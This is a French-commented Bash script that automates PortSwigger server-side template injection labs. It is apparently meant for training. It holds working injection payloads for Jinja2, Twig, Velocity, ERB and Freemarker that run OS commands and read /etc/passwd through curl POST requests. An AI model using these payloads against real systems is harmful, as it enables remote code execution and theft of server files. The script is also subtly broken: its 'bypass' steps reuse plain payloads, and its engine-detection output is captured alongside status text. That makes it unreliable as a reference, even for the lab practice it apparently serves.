#!/bin/bash

# === VARIABLES À PERSONNALISER ===
LAB_URL="https://votre-lab-portswigger.net"   # URL du lab
VULN_PARAM="name"                             # Nom du paramètre vulnérable
HEADERS=""                                    # Headers additionnels si besoin

# === PAYLOADS DE DÉTECTION PAR MOTEUR ===
declare -A DETECT_PAYLOADS
declare -A DETECT_EXPECTED
declare -A ENGINE_NAME

# Polyglotte pour détection générale
POLYGLOT='${{<%[%\'"}}%'

# Jinja2
DETECT_PAYLOADS["jinja2"]="{{7*7}}"
DETECT_EXPECTED["jinja2"]="49"
ENGINE_NAME["jinja2"]="Jinja2 (Python)"

# Twig
DETECT_PAYLOADS["twig"]="{{7*7}}"
DETECT_EXPECTED["twig"]="49"
ENGINE_NAME["twig"]="Twig (PHP)"

# Velocity
DETECT_PAYLOADS["velocity"]="#set(\$a=7*7) \$a"
DETECT_EXPECTED["velocity"]="49"
ENGINE_NAME["velocity"]="Velocity (Java)"

# ERB
DETECT_PAYLOADS["erb"]="<%= 7*7 %>"
DETECT_EXPECTED["erb"]="49"
ENGINE_NAME["erb"]="ERB (Ruby)"

# Freemarker
DETECT_PAYLOADS["freemarker"]='${7*7}'
DETECT_EXPECTED["freemarker"]="49"
ENGINE_NAME["freemarker"]="Freemarker (Java)"

# === PAYLOADS D'EXPLOITATION PAR MOTEUR ===
declare -A EXEC_PAYLOADS
declare -A EXEC_EXPECTED
declare -A FILE_PAYLOADS
declare -A FILE_EXPECTED

EXEC_PAYLOADS["jinja2"]="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
EXEC_EXPECTED["jinja2"]="uid="
FILE_PAYLOADS["jinja2"]="{{config.__class__.__init__.__globals__['open']('/etc/passwd').read()}}"
FILE_EXPECTED["jinja2"]="root:x"

EXEC_PAYLOADS["twig"]="{{['id']|filter('system')}}"
EXEC_EXPECTED["twig"]="uid="
FILE_PAYLOADS["twig"]="{{['cat /etc/passwd']|filter('system')}}"
FILE_EXPECTED["twig"]="root:x"

EXEC_PAYLOADS["velocity"]="#set(\$e='')#set(\$x='')#set(\$rt=\$e.class.forName('java.lang.Runtime'))#set(\$ex=\$rt.getRuntime().exec('id'))"
EXEC_EXPECTED["velocity"]="uid="
FILE_PAYLOADS["velocity"]="#set(\$e='')#set(\$x='')#set(\$rt=\$e.class.forName('java.lang.Runtime'))#set(\$ex=\$rt.getRuntime().exec('cat /etc/passwd'))"
FILE_EXPECTED["velocity"]="root:x"

EXEC_PAYLOADS["erb"]="<%= \`id\` %>"
EXEC_EXPECTED["erb"]="uid="
FILE_PAYLOADS["erb"]="<%= File.read('/etc/passwd') %>"
FILE_EXPECTED["erb"]="root:x"

EXEC_PAYLOADS["freemarker"]='${"freemarker.template.utility.Execute"?new()("id")}'
EXEC_EXPECTED["freemarker"]="uid="
FILE_PAYLOADS["freemarker"]='${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}'
FILE_EXPECTED["freemarker"]="root:x"

# === DÉTECTION DU MOTEUR DE TEMPLATE ===
detect_engine() {
    echo "[Analyse] Détection du moteur de template employé..."
    # 1. Polyglotte pour déclencher une erreur ou un comportement anormal
    echo "  > Injection du payload polyglotte : $POLYGLOT"
    resp=$(curl -s -X POST $HEADERS "$LAB_URL" -d "$VULN_PARAM=$POLYGLOT")
    if [[ "$resp" =~ error|exception|trace|unexpected|template|parse ]]; then
        echo "    => Réponse anormale détectée (possible SSTI)."
    fi

    # 2. Test de chaque moteur connu
    for engine in "${!DETECT_PAYLOADS[@]}"; do
        payload="${DETECT_PAYLOADS[$engine]}"
        expected="${DETECT_EXPECTED[$engine]}"
        echo "  > Test $engine : $payload"
        resp=$(curl -s -X POST $HEADERS "$LAB_URL" -d "$VULN_PARAM=$payload")
        if echo "$resp" | grep -q "$expected"; then
            echo "    => Moteur détecté : ${ENGINE_NAME[$engine]}"
            echo "$engine"
            return 0
        fi
    done
    echo "    => Aucun moteur connu détecté."
    echo ""
    return 1
}

# === CHALLENGE 1 : Exploiting basic server-side template injection ===
analyse_1() {
    echo -e "\n[1] Analyse : Exploiting basic server-side template injection"
    ENGINE=$(detect_engine)
    if [ -z "$ENGINE" ]; then
        echo "  => Impossible de détecter le moteur de template."
        return 1
    fi
    return 0
}
attaque_1() {
    echo "[1] Attaque : Injection mathématique ($ENGINE)"
    curl -s -X POST $HEADERS "$LAB_URL" -d "$VULN_PARAM=${DETECT_PAYLOADS[$ENGINE]}" | grep "${DETECT_EXPECTED[$ENGINE]}"
}
controle_1() {
    echo "[1] Contrôle : Résultat attendu '${DETECT_EXPECTED[$ENGINE]}'"
    if curl -s -X POST $HEADERS "$LAB_URL" -d "$VULN_PARAM=${DETECT_PAYLOADS[$ENGINE]}" | grep -q "${DETECT_EXPECTED[$ENGINE]}"; then
        echo "    => SSTI confirmée."
    else
        echo "    => SSTI non confirmée."
    fi
}

# === CHALLENGE 2 : Exploiting SSTI to execute arbitrary code ===
analyse_2() {
    echo -e "\n[2] Analyse : Exploiting SSTI to execute arbitrary code"
    ENGINE=$(detect_engine)
    if [ -z "$ENGINE" ]; then
        echo "  => Impossible de détecter le moteur de template."
        return 1
    fi
    return 0
}
attaque_2() {
    echo "[2] Attaque : Exécution de code ($ENGINE)"
    curl -s -X POST $HEADERS "$LAB_URL" -d "$VULN_PARAM=${EXEC_PAYLOADS[$ENGINE]}" | grep "${EXEC_EXPECTED[$ENGINE]}"
}
controle_2() {
    echo "[2] Contrôle : Résultat attendu '${EXEC_EXPECTED[$ENGINE]}'"
    if curl -s -X POST $HEADERS "$LAB_URL" -d "$VULN_PARAM=${EXEC_PAYLOADS[$ENGINE]}" | grep -q "${EXEC_EXPECTED[$ENGINE]}"; then
        echo "    => RCE confirmée."
    else
        echo "    => RCE non confirmée."
    fi
}

# === CHALLENGE 3 : Bypassing input filters to exploit SSTI ===
analyse_3() {
    echo -e "\n[3] Analyse : Bypassing input filters to exploit SSTI"
    ENGINE=$(detect_engine)
    if [ -z "$ENGINE" ]; then
        echo "  => Impossible de détecter le moteur de template."
        return 1
    fi
    return 0
}
attaque_3() {
    echo "[3] Attaque : Payload de contournement ($ENGINE)"
    # Exemple : pour Jinja2, Twig, ERB, etc. (ici, on reprend le payload mathématique)
    curl -s -X POST $HEADERS "$LAB_URL" -d "$VULN_PARAM=${DETECT_PAYLOADS[$ENGINE]}" | grep "${DETECT_EXPECTED[$ENGINE]}"
}
controle_3() {
    echo "[3] Contrôle : Résultat attendu '${DETECT_EXPECTED[$ENGINE]}'"
    if curl -s -X POST $HEADERS "$LAB_URL" -d "$VULN_PARAM=${DETECT_PAYLOADS[$ENGINE]}" | grep -q "${DETECT_EXPECTED[$ENGINE]}"; then
        echo "    => Bypass confirmé."
    else
        echo "    => Bypass non confirmé."
    fi
}

# === CHALLENGE 4 : Exploiting SSTI in a sandboxed environment (Twig) ===
analyse_4() {
    echo -e "\n[4] Analyse : Exploiting SSTI in a sandboxed environment (Twig)"
    ENGINE=$(detect_engine)
    if [ "$ENGINE" != "twig" ]; then
        echo "  => Ce challenge nécessite le moteur Twig."
        return 1
    fi
    return 0
}
attaque_4() {
    echo "[4] Attaque : Bypass Twig Sandbox"
    # Exemple : payload spécifique à Twig, à adapter selon le contexte du lab
    curl -s -X POST $HEADERS "$LAB_URL" -d "$VULN_PARAM={{['id']|filter('system')}}" | grep "uid="
}
controle_4() {
    echo "[4] Contrôle : Résultat attendu 'uid='"
    if curl -s -X POST $HEADERS "$LAB_URL" -d "$VULN_PARAM={{['id']|filter('system')}}" | grep -q "uid="; then
        echo "    => Sandbox bypass confirmé."
    else
        echo "    => Sandbox bypass non confirmé."
    fi
}

# === CHALLENGE 5 : Exploiting SSTI for remote code execution ===
analyse_5() {
    echo -e "\n[5] Analyse : Exploiting SSTI for remote code execution"
    ENGINE=$(detect_engine)
    if [ -z "$ENGINE" ]; then
        echo "  => Impossible de détecter le moteur de template."
        return 1
    fi
    return 0
}
attaque_5() {
    echo "[5] Attaque : RCE avancée ($ENGINE)"
    curl -s -X POST $HEADERS "$LAB_URL" -d "$VULN_PARAM=${EXEC_PAYLOADS[$ENGINE]}" | grep "${EXEC_EXPECTED[$ENGINE]}"
}
controle_5() {
    echo "[5] Contrôle : Résultat attendu '${EXEC_EXPECTED[$ENGINE]}'"
    if curl -s -X POST $HEADERS "$LAB_URL" -d "$VULN_PARAM=${EXEC_PAYLOADS[$ENGINE]}" | grep -q "${EXEC_EXPECTED[$ENGINE]}"; then
        echo "    => RCE confirmée."
    else
        echo "    => RCE non confirmée."
    fi
}

# === CHALLENGE 6 : Exfiltrating data via SSTI ===
analyse_6() {
    echo -e "\n[6] Analyse : Exfiltrating data via SSTI"
    ENGINE=$(detect_engine)
    if [ -z "$ENGINE" ]; then
        echo "  => Impossible de détecter le moteur de template."
        return 1
    fi
    return 0
}
attaque_6() {
    echo "[6] Attaque : Lecture de fichier ($ENGINE)"
    curl -s -X POST $HEADERS "$LAB_URL" -d "$VULN_PARAM=${FILE_PAYLOADS[$ENGINE]}" | grep "${FILE_EXPECTED[$ENGINE]}"
}
controle_6() {
    echo "[6] Contrôle : Résultat attendu '${FILE_EXPECTED[$ENGINE]}'"
    if curl -s -X POST $HEADERS "$LAB_URL" -d "$VULN_PARAM=${FILE_PAYLOADS[$ENGINE]}" | grep -q "${FILE_EXPECTED[$ENGINE]}"; then
        echo "    => Exfiltration confirmée."
    else
        echo "    => Exfiltration non confirmée."
    fi
}

# === MENU PRINCIPAL (RÉCURSIF) ===
main_menu() {
    echo
    echo "PortSwigger SSTI Challenges - Analyse, Attaque, Contrôle (détection moteur auto)"
    echo "--------------------------------------------------------------------------"
    echo "URL du lab : $LAB_URL"
    echo "Paramètre vulnérable : $VULN_PARAM"
    if [ -n "$HEADERS" ]; then echo "Headers : $HEADERS"; fi
    echo
    echo "1. [1] Exploiting basic server-side template injection"
    echo "2. [2] Exploiting SSTI to execute arbitrary code"
    echo "3. [3] Bypassing input filters to exploit SSTI"
    echo "4. [4] Exploiting SSTI in a sandboxed environment (Twig)"
    echo "5. [5] Exploiting SSTI for remote code execution"
    echo "6. [6] Exfiltrating data via SSTI"
    echo "q. Quit"
    echo
    read -p "Choisissez un challenge (1-6, q pour quitter) : " choix

    case $choix in
        1) analyse_1 && attaque_1 && controle_1; main_menu ;;
        2) analyse_2 && attaque_2 && controle_2; main_menu ;;
        3) analyse_3 && attaque_3 && controle_3; main_menu ;;
        4) analyse_4 && attaque_4 && controle_4; main_menu ;;
        5) analyse_5 && attaque_5 && controle_5; main_menu ;;
        6) analyse_6 && attaque_6 && controle_6; main_menu ;;
        q) echo "Sortie." ;;
        *) echo "Choix invalide."; main_menu ;;
    esac
}

main_menu
